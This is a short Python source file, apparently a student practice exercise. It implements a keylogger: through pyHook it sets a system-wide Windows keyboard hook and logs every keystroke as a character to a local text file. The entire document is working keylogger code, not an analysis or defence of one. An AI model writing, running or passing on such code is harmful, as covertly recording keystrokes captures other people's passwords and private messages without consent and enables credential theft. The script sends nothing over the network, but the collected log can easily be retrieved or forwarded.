import pyHook, pythoncom, sys, logging

file_log= "C:\work\hazik\gyak\log.txt"

def on_keyboard_event(event):
    logging.basicConfig(filename=file_log, level= logging.DEBUG, format="%(message)s")
    chr(event.Ascii)
    logging.log(10,chr(event.Ascii))
    return True

hooks_manager= pyHook.HookManager()
hooks_manager.KeyDown= on_keyboard_event
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()